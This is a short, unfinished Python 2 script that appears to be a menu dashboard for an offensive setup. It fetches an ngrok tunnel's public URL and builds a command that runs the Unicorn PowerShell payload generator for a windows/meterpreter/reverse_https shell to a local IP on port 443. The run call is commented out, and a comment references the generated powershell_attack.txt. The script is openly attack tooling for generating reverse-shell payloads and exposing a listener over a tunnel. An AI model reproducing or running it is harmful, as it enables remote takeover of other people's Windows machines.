import json
import requests
import os
#python -c 'import requests; import json; print json.loads(requests.get("http://localhost:4040/api/tunnels").content.decode("utf-8"))["tunnels"][0]["public_url"]'

def get_ngrok_url():
    url = "http://localhost:4040/api/tunnels"
    res = requests.get(url)
    res_unicode = res.content.decode("utf-8")
    res_json = json.loads(res_unicode)
    return res_json["tunnels"][0]["public_url"]


def foo():
    print "You called foo()"
    raw_input("Press [Enter] to continue...")


def bar():
    print "You called foo()"
    raw_input("Press [Enter] to continue...")

def start():
	cmd = "python /opt/unicorn/unicorn.py windows/meterpreter/reverse_https '%s' 443" % ('192.168.1.6')
	print cmd
	#print os.system(cmd)

menuItems = [
    { "Call foo": foo },
    { "Call bar": bar },
]

def dashboard():
	print "Address: %s" % (get_ngrok_url())
	print os.system("ifconfig -a | grep BROADCAST | cut -d ':' -f 1")
        

def main():
    while True:
        os.system('clear')
        dashboard()
        for item in menuItems:
            print "[" + str(menuItems.index(item)) + "] " + item.keys()[0]

        sel = raw_input("selection:")

        return sel



main()





#cat /opt/unicorn/powershell_attack.txt

